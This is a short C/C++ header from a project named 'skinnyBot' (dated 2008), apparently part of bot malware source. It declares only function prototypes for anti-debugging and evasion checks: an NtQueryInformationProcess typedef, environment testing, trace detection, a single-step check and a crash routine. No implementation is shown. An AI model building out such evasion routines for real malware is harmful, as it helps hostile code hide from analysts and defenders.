//skinnyBot March 29th 2008

#pragma once 

#include "skinnyBot.h"

#define ENV_OK 10
#define ENV_NOTOK 20

typedef NTSTATUS (__stdcall *fnNtQueryInformationProcess)(HANDLE ProcessHandle, PROCESSINFOCLASS ProcessInformationClass, PVOID ProcessInformation, ULONG ProcessInformationLength, PULONG ReturnLength);

void _cdecl Crash();
bool _cdecl TestEnvironment();
bool _cdecl DetectTracing(DWORD oldTime);

extern void _cdecl InitalSingleStepCheck();
void _cdecl InitalSingleStepCheck();
